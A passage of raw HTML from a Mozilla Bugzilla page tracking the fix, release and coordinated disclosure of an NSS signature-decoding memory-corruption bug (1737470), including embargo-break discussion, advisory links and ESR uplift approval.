      <meta itemprop="encodingFormat" content="text/x-phabricator-request">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9253226" itemprop="contentUrl" >
        <span id="att-9253226-description" itemprop="description">Bug 1737470 - land NSS NSS_3_68_1_RTM UPGRADE_NSS_RELEASE, r=kaie</span></a>
        â€” <a href="attachment.cgi?id=9253226&amp;action=edit" itemprop="url" data-details="1">Details</a>
      </div>
    </div>

  <div
      class="comment-text markdown-body "
      id="ct-88" data-comment-id="15679255"><p>2021-12-01  Benjamin Beurdouche  &lt;<a href="mailto:bbeurdouche@mozilla.com" rel="nofollow">bbeurdouche@mozilla.com</a>&gt;</p>
<pre><code>* lib/nss/nss.h, lib/softoken/softkver.h, lib/util/nssutil.h:
Set version numbers to 3.68.1 final
[6e68b52ee28b] [NSS_3_68_1_RTM] &lt;NSS_3_68_1_BRANCH&gt;
</code></pre>
<p>2021-10-11  John M. Schanck  &lt;<a href="mailto:jschanck@mozilla.com" rel="nofollow">jschanck@mozilla.com</a>&gt;</p>
<pre><code>* gtests/certdb_gtest/decode_certs_unittest.cc, lib/pkcs7/certread.c:
Bug 1735028 - check for missing signedData field r=keeler

[5b2659c39cc7] &lt;NSS_3_68_1_BRANCH&gt;
</code></pre>
<p>2021-11-22  Dennis Jackson  &lt;<a href="mailto:djackson@mozilla.com" rel="nofollow">djackson@mozilla.com</a>&gt;</p>
<pre><code>* lib/cryptohi/secvfy.c:
Bug 1737470 - Ensure DER encoded signatures are within size limits.
r=jschanck,mt,bbeurdouche,rrelyea

[dea71cbef9e0] &lt;NSS_3_68_1_BRANCH&gt;
</code></pre>
<p>2021-07-08  Benjamin Beurdouche  &lt;<a href="mailto:bbeurdouche@mozilla.com" rel="nofollow">bbeurdouche@mozilla.com</a>&gt;</p>
<pre><code>* .hgtags:
Added tag NSS_3_68_RTM for changeset 3680dc580194
[da3d22d708c9] &lt;NSS_3_68_BRANCH&gt;
</code></pre>
</div></div><div class="change-set" id="c89"><div class="comment" data-id="15679294" data-no="89"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-89" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a3281852_622637"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a3281852_622637"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-89"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-89" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c89">Comment 89</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 07:21 PST" data-time="1638372091">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-89">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-89" data-comment-id="15679294"><p>Everyone should be aware already but commenting here just in case...<br>
The embargo was broken a few hours ago so - in agreement with the Linux distros list - the new public disclosure is set to: December 1st, 16:00 UTC</p>
</div></div><div class="change-set" id="c90"><div class="comment" data-id="15679331" data-no="90"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-90" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_11099" id="a3281852_622637"><img src="https://secure.gravatar.com/avatar/4e29cfbfaece102427b6d6aa84d135f5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_11099" id="a3281852_622637"><a class="email " href="/user_profile?user_id=11099" > <span class="fna">Robert Relyea</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-90"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-90" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c90">Comment 90</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 07:44 PST" data-time="1638373491">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-90">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-90" data-comment-id="15679331"><p>Thanks Benjamin for the response. We are looking at the issue in Red Hat. It looks like a tooling issue. The builds were properly marked as embargoed in our private tree, but the centos stream tools still automatically pulled them into the public tree. Clearly we need to fix what went wrong.</p>
<p>bob</p>
</div></div><div class="change-set" id="c91"><div class="comment" data-id="15679346" data-no="91"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-91" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_331752" id="a3281852_622637"><img src="https://secure.gravatar.com/avatar/0906041fcade715bfd1cb25f1d12cb8d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_331752" id="a3281852_622637"><a class="email " href="/user_profile?user_id=331752" > <span class="fna">Huzaifa Sidhpurwala</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-91"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-91" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c91">Comment 91</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 07:54 PST" data-time="1638374077">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-91">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-91" data-comment-id="15679346"><p>Is there going to be a mozilla advisory or nss release notes, or any way to know the issue is &quot;really&quot; public now?</p>
</div></div><div class="change-set" id="c92"><div class="comment" data-id="15679353" data-no="92"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-92" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a3281852_622637"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a3281852_622637"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-92"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-92" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c92">Comment 92</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 07:57 PST" data-time="1638374263">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-92">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-92" data-comment-id="15679353"><p>We are gonna push the commits+tags to the NSS repo, effectively making NSS 3.73.0 and NSS 3.68.1 ESR public.<br>
The archives are gonna be uploaded to the Mozilla FTP server as usual and we will email dev-tech-crypto and provide an advisory shortly after.</p>
<p>Note that because the timeline changed, 3.73.0 contains the fix.</p>
</div></div><div class="change-set" id="c93"><div class="comment" data-id="15679444" data-no="93"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-93" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a3281852_622637"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a3281852_622637"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-93"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-93" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c93">Comment 93</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 08:22 PST" data-time="1638375755">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-93">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-93" data-comment-id="15679444"><p>The NSS 3.73.0 and 3.68.1 (ESR) releases are now public. <a href="https://hg.mozilla.org/projects/nss/graph" rel="nofollow">https://hg.mozilla.org/projects/nss/graph</a></p>
</div></div><div class="change-set" id="c94"><div class="comment" data-id="15679446" data-no="94"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-94" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a3281852_622637"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a3281852_622637"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-94"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-94" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c94">Comment 94</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 08:25 PST" data-time="1638375901">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-94">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-94" data-comment-id="15679446"><p><a href="https://hg.mozilla.org/projects/nss/rev/f80fafd04cf82b4d315c8fe42bb4639703f6ee4f" rel="nofollow">https://hg.mozilla.org/projects/nss/rev/f80fafd04cf82b4d315c8fe42bb4639703f6ee4f</a><br>
<a href="https://hg.mozilla.org/projects/nss/rev/dea71cbef9e03636f37c6cb120f8deccce6e17dd" rel="nofollow">https://hg.mozilla.org/projects/nss/rev/dea71cbef9e03636f37c6cb120f8deccce6e17dd</a> (NSS_3_68_1_BRANCH)<br>
<a href="https://hg.mozilla.org/projects/nss/rev/6b3dc97a8767d9dc5c4c181597d1341d0899aa58" rel="nofollow">https://hg.mozilla.org/projects/nss/rev/6b3dc97a8767d9dc5c4c181597d1341d0899aa58</a> (NSS_3_73_BRANCH)</p>
</div></div><div class="change-set" id="c95"><div class="comment" data-id="15679481" data-no="95"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-95" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a3281852_622637"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a3281852_622637"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-95"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-95" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c95">Comment 95</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 08:49 PST" data-time="1638377380">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-95">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-95" data-comment-id="15679481"><p>The NSS advisory is up: <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2021-51/" rel="nofollow">https://www.mozilla.org/en-US/security/advisories/mfsa2021-51/</a></p>
</div></div><div class="change-set" id="c96"><div class="comment" data-id="15679495" data-no="96"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-96" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a3281852_622637"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a3281852_622637"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-96"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-96" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c96">Comment 96</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 09:00 PST" data-time="1638378056">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-96">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-96" data-comment-id="15679495"><p>Comment on <span class=""><a href="/attachment.cgi?id=9253226" name="attach_9253226" title="Bug 1737470 - land NSS NSS_3_68_1_RTM UPGRADE_NSS_RELEASE, r=kaie">attachment 9253226</a> <a href="/attachment.cgi?id=9253226&amp;action=edit" title="Bug 1737470 - land NSS NSS_3_68_1_RTM UPGRADE_NSS_RELEASE, r=kaie">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">Bug 1737470</a> - land NSS NSS_3_68_1_RTM UPGRADE_NSS_RELEASE, r=kaie</p>
<h3>ESR Uplift Approval Request</h3>
<ul>
<li><strong>If this is not a sec:{high,crit} bug, please state case for ESR consideration</strong>: critical bug for Thunderbird</li>
<li><strong>User impact if declined</strong>: potentially exploitable crash using yet undiscovered attack vectors</li>
<li><strong>Fix Landed on Version</strong>:</li>
<li><strong>Risk to taking this patch</strong>: Low</li>
<li><strong>Why is the change risky/not risky? (and alternatives if risky)</strong>: The risk seems minimal for Firefox, because apparently it doesn&#39;t use the modified APIs.<br>
The additional safety checks are desired for Thunderbird.</li>
<li><strong>String or UUID changes made by this patch</strong>:</li>
</ul>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9253226&amp;action=edit"
           title="Bug 1737470 - land NSS NSS_3_68_1_RTM UPGRADE_NSS_RELEASE, r=kaie"
           class=""
        >Attachment #9253226</a> -
        Flags: approval-mozilla-esr91?</div></div></div><div class="change-set" id="c97"><div class="comment" data-id="15679499" data-no="97"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-97" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a3281852_622637"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a3281852_622637"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-97"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-97" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c97">Comment 97</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 09:04 PST" data-time="1638378270">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-97">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-97" data-comment-id="15679499"><p>Comment on <span class=""><a href="/attachment.cgi?id=9253226" name="attach_9253226" title="Bug 1737470 - land NSS NSS_3_68_1_RTM UPGRADE_NSS_RELEASE, r=kaie">attachment 9253226</a> <a href="/attachment.cgi?id=9253226&amp;action=edit" title="Bug 1737470 - land NSS NSS_3_68_1_RTM UPGRADE_NSS_RELEASE, r=kaie">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">Bug 1737470</a> - land NSS NSS_3_68_1_RTM UPGRADE_NSS_RELEASE, r=kaie</p>
<p>Approved for TB 91.4.0 build2. As has been discussed previously, we&#39;re not planning to respin the Firefox 91.4.0esr build for this, so this change will ride with the 91.5.0esr release shipping alongside Firefox 96 in January.</p>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9253226&amp;action=edit"
           title="Bug 1737470 - land NSS NSS_3_68_1_RTM UPGRADE_NSS_RELEASE, r=kaie"
           class=""
        >Attachment #9253226</a> -
        Flags: approval-mozilla-esr91? &rarr; approval-mozilla-esr91+</div></div></div><div class="change-set" id="c98"><div class="comment" data-id="15679500" data-no="98"
       data-tags="uplift">
    
    <table class="layout-table change-head " id="ch-98" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a3281852_622637"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a3281852_622637"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-98"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-98" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c98">Comment 98</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 09:05 PST" data-time="1638378334">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-98">
        <td colspan="2" class="comment-tags"><span class="comment-tag" data-tag="uplift">uplift
  </span>
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-98" data-comment-id="15679500"><p>Landed on ESR91:<br>
<a href="https://hg.mozilla.org/releases/mozilla-esr91/rev/b6173cd78c9d522f2e3257c408933db4f9cedc13" rel="nofollow">https://hg.mozilla.org/releases/mozilla-esr91/rev/b6173cd78c9d522f2e3257c408933db4f9cedc13</a></p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox95&amp;o1=isnotempty">status-firefox95</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox95&amp;o1=equals&amp;v1=disabled">disabled</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox95&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr91&amp;o1=isnotempty">status-firefox-esr91</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr91&amp;o1=equals&amp;v1=disabled">disabled</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr91&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr91&amp;o1=isnotempty">tracking-firefox-esr91</a>:
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr91&amp;o1=equals&amp;v1=95%2B">95+</a> &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr91&amp;o1=equals&amp;v1=96%2B">96+</a></div></div></div><div class="change-set" id="c99"><div class="comment" data-id="15679524" data-no="99"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-99" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a3281852_622637"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a3281852_622637"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-99"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-99" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c99">Comment 99</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 09:26 PST" data-time="1638379565">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-99">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-99" data-comment-id="15679524"><p>Tavis un-hid the GP0 bug: <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2237" rel="nofollow">https://bugs.chromium.org/p/project-zero/issues/detail?id=2237</a></p>
</div><div class="activity"><div class="change">See Also:  &rarr; <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2237" target="_blank" rel="noreferrer">https://bugs.chromium.org/p/project-zero/issues/detail?id=2237</a></div></div></div><div class="change-set" id="a3292823_1689"><div class="change" id="aa3292823_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a3292823_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a3292823_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a3292823_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a3292823_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a3292823_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 09:39 PST" data-time="1638380380">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Automatic S/MIME cert import should use additional verification using mozilla::pkix"
   href="/show_bug.cgi?id=1738501">CVE-2021-43529</a></div></div></div><div class="change-set" id="a3294421_1689"><div class="change" id="aa3294421_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a3294421_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a3294421_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a3294421_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a3294421_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a3294421_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 10:06 PST" data-time="1638381978">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Blocks: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Automatic S/MIME cert import should use additional verification using mozilla::pkix"
   href="/show_bug.cgi?id=1738501">CVE-2021-43529</a></div><div class="change">Group: crypto-core-security &rarr; core-security-release</div><div class="change">No longer depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Automatic S/MIME cert import should use additional verification using mozilla::pkix"
   href="/show_bug.cgi?id=1738501">CVE-2021-43529</a></div></div></div><div class="change-set" id="a3294941_1689"><div class="change" id="aa3294941_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a3294941_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a3294941_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a3294941_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a3294941_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a3294941_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 10:14 PST" data-time="1638382498">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Status: NEW &rarr; RESOLVED</div><div class="change">Closed: <span class="rel-time" title="2021-12-01 10:14 PST" data-time="1638382498">3 years ago</span></div><div class="change">Resolution: --- &rarr; FIXED</div></div></div><div class="change-set" id="a3294962_575867"><div class="change" id="aa3294962_575867">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_575867" id="a3294962_575867"><img src="https://secure.gravatar.com/avatar/9eb8612b118640351041fb0877c5fc8f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_575867" id="a3294962_575867"><a class="email " href="/user_profile?user_id=575867" > <span class="fna">BugBot [:suhaib / :marco/ :calixte]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a3294962_575867"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a3294962_575867">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a3294962_575867">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 10:15 PST" data-time="1638382519">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Keywords: <span class="activity-deleted"><a href="/buglist.cgi?keywords=leave-open&amp;resolution=---">leave-open</a></span></div></div></div><div class="change-set" id="a3302168_1689"><div class="change" id="aa3302168_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a3302168_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a3302168_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a3302168_1689"
                  aria-label="Collapse" aria-expanded="true"
